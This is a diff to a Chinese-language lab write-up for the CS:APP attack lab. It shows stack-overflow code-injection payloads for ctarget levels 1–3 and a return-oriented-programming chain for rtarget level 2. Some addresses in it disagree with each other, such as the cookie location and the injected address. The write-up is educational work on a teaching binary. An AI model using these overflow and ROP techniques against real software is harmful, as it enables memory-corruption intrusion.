@@ -5,9 +5,12 @@
 
 - [简介](#简介)
 - [ctarget](#ctarget)
-  - [phase1](#phase1)
-  - [phase2](#phase2)
-  - [phase3](#phase3)
+  - [level1](#level1)
+  - [level2](#level2)
+  - [level3](#level3)
+- [rtarget](#rtarget)
+  - [level2](#level2-1)
+  - [level3](#level3-1)
 
 <!-- /code_chunk_output -->
 
@@ -37,7 +40,7 @@
 ## ctarget
 ----
 
-### phase1
+### level1
 
 1. 任务
    在`getbuf`返回后跳转执行`touch1`函数，即修改保存的返回地址。使用`objdump -d`反汇编，查看`touch1`地址为`0x4017c0`。
@@ -54,7 +57,7 @@
       0x00000000004017bd <+21>:	retq   
    End of assembler dump.
    ```
-   在调用`Gets`之前，在栈上开辟了大小为0x28（40）的空间，推测`BUFFER_SIZE=40Byte`。用随意40个字节填满buffer，然后用`touch1`的地址覆盖返回地址。
+   在调用`Gets`之前，在栈上开辟了大小为0x28（40）的空间，推测`BUFFER_SIZE=40Byte`。用随意40个字节填满buffer，然后用`touch1`的地址覆盖返回地址。在ret之前`%rsp`值为0x5561dca0。
 
    在`ctarge.l1`中写入：
    ```
@@ -72,7 +75,7 @@
    ```
    ![ctarget_l1_stack](./ctarget_l1_stack.png)
 
-### phase2
+### level2
 
 1. 任务
    跳转执行`touch2`函数，并传入正确的`cookie`。
@@ -147,7 +150,7 @@
    ```
 
    最后得到`ctarget.l2`
-   ```c
+   ```
    00 01 02 03 04 05 06 07 08 09
    10 11 12 13 14 15 16 17 18 19
    20 21 22 23 24 25 26 27 28 29
@@ -162,40 +165,120 @@
    我的注入代码选择放在返回地址后面。放在`getbuf`的栈帧里可能更安全，否则可能覆盖一些数据导致程序异常退出。
    ![ctarget_l2_stack](./ctarget_l2_stack.png)
 
-### phase3
+### level3
 1. 任务
    - 漏洞字符串中包含`cookie`的字符串表示形式，包含8个16进制数（没有0x开头）。
    - 字符串以值为0的字节结尾。
-   - 设置`%rdi`寄存器的值为这个字符串。
+   - 设置`%rdi`寄存器的值为这个字符串的地址。
    - 当调用`hexmatch`和`strncmp`时，他们把数据push入栈，可能会覆盖`getbuf`的栈帧，所以要注意`cookie string`的存放位置。
 
-2. 在进入`hexmatch`之前打断点
+2. 分别查看`touch3`和`hexmatch`的堆栈操作
+   `touch3`调用`hexmatch`之前的堆栈操作：
    ```c
    (gdb) disas
    Dump of assembler code for function touch3:
-      0x00000000004018fa <+0>:	push   %rbx
-      0x00000000004018fb <+1>:	mov    %rdi,%rbx  ;%rbx=cookie string
+   => 0x00000000004018fa <+0>:	push   %rbx
+      0x00000000004018fb <+1>:	mov    %rdi,%rbx
       0x00000000004018fe <+4>:	movl   $0x3,0x202bd4(%rip)        # 0x6044dc <vlevel>
-      0x0000000000401908 <+14>:	mov    %rdi,%rsi  ;%rsi=cookie string
-      0x000000000040190b <+17>:	mov    0x202bd3(%rip),%edi        # 0x6044e4 <cookie> ;%edi=cookie
-   => 0x0000000000401911 <+23>:	callq  0x40184c <hexmatch>
+      0x0000000000401908 <+14>:	mov    %rdi,%rsi
+      0x000000000040190b <+17>:	mov    0x202bd3(%rip),%edi        # 0x6044e4 <cookie>
+      0x0000000000401911 <+23>:	callq  0x40184c <hexmatch>
    ```
-   查看`rsp`地址为`0x5561dca0`，cookie仍然存放在地址`0x6044e4`处，值为0x59b997fa，对应的16进制为`35 39 62 39 39 37 66 61 00`。`rbx`和`rsi`保存cookie string，`edi`保存cookie。
 
-3. 进入`hexmatch`查看
-   跳转后`rsp`=0x5561dc98，返回地址入栈。
+   进入`hexmatch`后的堆栈操作：
    ```c
    (gdb) disas
    Dump of assembler code for function hexmatch:
-      0x000000000040184c <+0>:	push   %r12
+   => 0x000000000040184c <+0>:	push   %r12
       0x000000000040184e <+2>:	push   %rbp
-      0x000000000040184f <+3>:	push   %rbx ;%rsp-24=0x5561dc80，cookie sring入栈
-      0x0000000000401850 <+4>:	add    $0xffffffffffffff80,%rsp  ;%rsp-128=0x5561dc00
-      0x0000000000401854 <+8>:	mov    %edi,%r12d ；%r12d=cookie
-      0x0000000000401857 <+11>:	mov    %rsi,%rbp
-      0x000000000040185a <+14>:	mov    %fs:0x28,%rax
-      0x0000000000401863 <+23>:	mov    %rax,0x78(%rsp)
-      0x0000000000401868 <+28>:	xor    %eax,%eax
-      0x000000000040186a <+30>:	callq  0x400db0 <random@plt>
+      0x000000000040184f <+3>:	push   %rbx
+      0x0000000000401850 <+4>:	add    $0xffffffffffffff80,%rsp
    ```
-   `ecx`寄存器保存format，`rdi`保存cookie，关键是找到char *s
+
+   `touch3`进行一次push后进入`hexmatch`,`hexmatch`进行3次push，然后`%rsp`-128。显然，`cookie string`要放在高地址，否则会被覆盖。`cookie`存放在`0x6054e4`，值为`0x59b997fa`。
+   ![ctarget_l3_stack](./ctarget_l3_stack.png)
+
+   `example.s`：
+   ```c
+   mov $0x5561dc78,%edi
+   push $0x4018fa ;touch3 address
+   ret
+   ```
+   汇编并反汇编后写入`ctarget.l3`：
+   ```
+   00 01 02 03 04 05 06 07 08 09
+   10 11 12 13 14 15 16 17 18 19
+   20 21 22 23 24 25 26 27 28 29
+   30 31 32 33 34 35 36 37 38 39
+   b1 dc 61 55 00 00 00 00 /* ret address */
+   35 39 62 39 39 37 66 61 00  /* cookie string */
+   bf a8 dc 61 55  /* mov    $0x5561dca8,%edi */
+   68 fa 18 40 00  /* pushq  $0x4018fa */
+   c3  /* retq */
+   ```
+
+## rtarget
+----
+
+- `rtarget`使用asrl（Address space layout randomization地址空间配置随机加载）让数据空间地址随机化，所以每次运行的时候堆栈位置都不同，不能直接定位到漏洞代码处。
+
+- 数据段被标记为不可执行，即使能够定位到漏洞代码处，也会引发segmentation fault。
+
+- 使用ROP攻击。利用已有的代码段（glibc、dead code无用代码等），`gadget`：1或n条有用指令+ret。
+
+- 找到`gadget farm`中有用的代码段进行ROP攻击。`gadget farm`范围：`start_farm` ~ `end_farm`。
+
+### level2
+
+1. 任务
+   使用ROP攻击，重复phase2的任务。可以使用`movq`、`popq`、`ret`、`nop`指令，并只能使用x86-64的前8个寄存器（%rax-%rdi）。只能使用`start_farm`到`mid_farm`之间的gadget。
+
+2. 实现
+   在`start_farm`到`mid_farm`中没有`mov %rsp %rdi`指令，所以不能从栈中弹出数据到`%rdi`中。查看有用的mov指令只有`mov %rax %rdi`，所以要先把栈中数据pop到`%rax`中。
+
+   用到的gadget:
+   ```c
+   00000000004019a0 <addval_273>:
+     4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+     4019a6:	c3                   	retq
+   ```
+   pop指令机器码为58，随便找一个后面带ret的gadget
+   ```c
+   00000000004019ca <getval_280>:
+     4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
+     4019cf:	c3                   	retq
+   ```
+
+   最终得到的`rtarget.l2`:
+   ```
+   00 01 02 03 04 05 06 07 08 09
+   10 11 12 13 14 15 16 17 18 19
+   20 21 22 23 24 25 26 27 28 29
+   30 31 32 33 34 35 36 37 38 39
+   cc 19 40 00 00 00 00 00 /* gadget1 address */
+   fa 97 b9 59 00 00 00 00 /* cookie */
+   a2 19 40 00 00 00 00 00 /* gadget2 address */
+   ec 17 40 00 00 00 00 00 /* touch2 address */
+   ```
+
+### level3
+
+1. 任务
+   使用farm中的gadget，官方答案用到8个gadget（可能有重复的）。
+> 使用了地址空间分配随机化，注意mov指令对一个寄存器的最高4字节做了什么。
+
+2. 实现
+   gadget farm中的mov指令：
+   ```c
+   89 c7 mov %eax %edi
+   89 c2 mov %eax %edx
+   89 ce mov %ecx %esi         
+   89 d1 mov %edx %ecx
+   89 e0 mov %esp %eax
+   ```
+
+   pop指令：
+   ```c
+   58 pop %rax
+   5c pop %rsp ;后接89 c2
+   ```
